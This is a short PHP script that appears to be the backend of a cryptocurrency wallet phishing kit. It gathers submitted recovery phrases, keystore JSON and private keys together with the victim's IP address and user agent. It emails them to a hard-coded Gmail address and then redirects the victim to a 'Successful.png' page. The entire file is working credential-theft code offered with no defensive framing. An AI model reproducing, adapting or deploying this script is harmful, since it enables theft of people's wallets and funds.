<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "Type : ".$_POST['referer_title']."\n";
$message .= "Recovery phrase key: ".$_POST['form']."\n";
$message .= "Keystore JSON : ".$_POST['form1']."\n";
$message .= "private key : ".$_POST['form2']."\n";
$message .= "Client IP: ".$ip."\n";
$message .= "User Agent : ".$useragent."\n";
$send = "ojulie621@gmail.com";
$subject = "CRYPTO | ".$_POST['referer_title']." | $ip";
{
mail("$send", "$subject", $message);   

header ("Location: Successful.png");
}

?>